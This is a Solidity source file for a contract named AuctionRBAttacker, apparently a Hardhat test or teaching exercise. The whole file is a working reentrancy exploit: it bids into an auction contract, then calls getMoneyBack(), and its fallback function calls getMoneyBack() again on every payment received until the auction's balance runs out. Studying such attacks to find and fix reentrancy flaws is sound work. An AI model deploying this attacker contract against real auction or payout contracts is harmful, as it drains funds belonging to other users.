// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IAuctionRB {
    function bidInfo(address) external returns(uint);
}

contract AuctionRBAttacker {
    IAuctionRB auction;

    constructor(address auctionAddress){
        auction = IAuctionRB(auctionAddress);
    }

    function bid() external payable {
        (bool success,) = address(auction).call{value: msg.value}(abi.encodeWithSignature("bid()"));
        require(success);
    }

    function attack() external payable {
        (bool success,) = address(auction).call(abi.encodeWithSignature("getMoneyBack()"));
        require(success);
    }

    fallback() external payable{
        if (msg.value > 0) {
            console.logString("fallback ");
            uint bidInfo = auction.bidInfo(address(this));
            uint getBackValue = bidInfo / 5;
            if (address(auction).balance >= getBackValue) {
                (bool success,) = address(auction).call(abi.encodeWithSignature("getMoneyBack()"));
                require(success);
            }
        }
    }
}
